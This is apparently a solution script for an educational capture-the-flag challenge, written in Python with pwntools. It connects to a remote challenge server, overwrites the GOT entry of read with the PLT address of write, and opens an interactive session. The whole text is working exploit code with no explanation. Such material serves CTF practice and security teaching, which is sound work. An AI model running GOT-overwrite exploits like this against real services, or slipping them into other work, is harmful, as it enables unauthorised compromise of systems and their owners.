from pwn import *

context.arch = 'amd64'
r = remote('edu-ctf.zoolab.org', 10004)

read_got = 0x404038
write_plt = 0x4010c0

r.sendlineafter(b'Overwrite addr: ', str(read_got).encode())
r.sendafter(b'Overwrite 8 bytes value: ', p64(write_plt))

r.interactive()